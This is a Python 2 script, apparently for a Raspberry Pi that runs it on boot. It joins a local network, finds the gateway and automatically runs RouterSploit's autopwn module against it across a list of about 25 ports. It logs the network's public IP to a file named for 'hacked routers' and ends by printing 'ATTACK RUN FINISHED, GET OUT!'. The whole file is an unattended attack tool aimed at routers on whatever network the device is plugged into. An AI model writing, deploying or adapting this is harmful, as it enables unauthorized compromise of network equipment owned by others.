#!/usr/bin/python
import os, sys, operator, socket, subprocess, threading, time, pexpect, netifaces
#logging
# from __future__ import absolute_import
# from __future__ import print_function
# from __future__ import unicode_literals

import pexpect
import re

#logger = logging.getLogger('simple_example')
#logger.setLevel(logging.DEBUG)
# create file handler which logs even debug messages
#fh = logging.FileHandler('/root/logger_sucks.log')
#fh.setLevel(logging.DEBUG)
# create console handler with a higher log level
#ch = logging.StreamHandler()
#ch.setLevel(logging.ERROR)
# create formatter and add it to the handlers
#formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
#ch.setFormatter(formatter)
#fh.setFormatter(formatter)
# add the handlers to logger
#logger.addHandler(ch)
#logger.addHandler(fh)

port_list = {0: '80',1: '443',2: '8080',3: '81',4: '4567',5: '9999',6: '22',7: '23',8: '25',9: '53',10: '139',11: '445',12: '137',13: '8086',14: '2869',15: '8009',16: '12345',17: '68',18: '4444',19: '5009',20: '10000',21: '161',22: '5353',23: '5351',24: '192'}

def routing_fix(gateway_ip, interface):
	subnet = gateway_ip.split('.')
	subnet = """%s.%s.%s.0""" % (
		str(subnet[0]),
		str(subnet[1]),
		str(subnet[2])
)
	print subnet
	autoroutecmd = "route add -net %s netmask 255.255.255.0 gw %s dev %s" % (
		str(subnet),
		str(gateway_ip),
		str(interface)
)
	bash_command(autoroutecmd)

	ippullcmd = "dig +short myip.opendns.com @resolver1.opendns.com"
	ipfile = "/home/pi/ip_addr_hacked_routers.log"
	timestr = time.strftime("%Y%m%d-%H%M%S")
	ippullcmd = "%s >> %s" % (
		str(ippullcmd),
		str(ipfile)
)
	addtimecmd = "echo %s >> %s" % (
		str(timestr),
		str(ipfile)
)

	bash_command(ippullcmd)
	bash_command(addtimecmd)

	checkcmd = "cat %s" % str(ipfile)
	bash_command(checkcmd)
	counter = 0
    	for counter in port_list:
		port = port_list[counter]
	        counter += 1
        	port = str(port.strip())
	        print "TARGETED PORT for autopwn: %s" % str(port)
	        rsf_command_sequence_2(port, gateway_ip)

	return gateway_ip, subnet, interface, port

def bash_command(cmd):
    subprocess.call(cmd,shell=True,executable="/bin/bash")
    return
def rsf_command_sequence_2(port,gateway_ip):

    port = str(port)
    cmd = "python /usr/local/bin/rsf.py"
    child = pexpect.spawn(cmd, logfile=sys.stdout, timeout=300)
    child.expect("rsf")

    child.sendline('use scanners/autopwn')

    child.expect('AutoPwn')
    # target_ip = "10.0.1.1"
    target_line = "set target {0}".format(str(gateway_ip))
    child.sendline(target_line)

    child.expect("{'target':")
    # port = "80"
    target_port = "set port {0}".format(str(port))
    child.sendline(target_port)

    child.expect("'port':")

    child.sendline('run')
    # counter += 1
    child.expect('Could not confirm any vulnerablity')
    child.sendline('exit')
    # if Exception:
	#        detect_network()
    return
def rsf_command_sequence(gateway_ip, port):
    return
def pull_routing_path(port_list, yourself, interface):
    os.system('clear')
    gws = netifaces.gateways()
    gateway_ip = gws['default'][netifaces.AF_INET][0]
    print "Your GATEWAY on this network is: %s" % str(gateway_ip)
    routing_fix(gateway_ip, interface)
    os.system('clear')
    print "ATTACK RUN FINISHED, GET OUT!"
    time.sleep(300)
    detect_network()
    return

def detect_network():
    print "Detecting networks"
    time.sleep(3)

    interfaces = ['eth0', 'wlan0','wlan1','wlan0']
    interface = 'wlan0'
    try:
        yourself = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']
	print yourself
        if yourself != "" or None or 0:
            if yourself != "0.0.0.0" or '127.0.0.1' or 'ether':
                debug_str = "DEBUG: Your IP ADDRESS is %s" % str(yourself)
                print debug_str

                pull_routing_path(port_list, yourself, interface)
#            elif Exception:
 #               print "No networks found on interface %s" % str(interface)
  #              detect_network()
   #     elif Exception:
    #        print "No networks found on interface %s" % str(interface)
     #       detect_network()

    except KeyError:
        print "No networks found on interface %s" % str(interface)

        detect_network()
    return gateway_ip, interface
print("Raspberry Pi just booted. Scanning for networks to login to.")
detect_network()
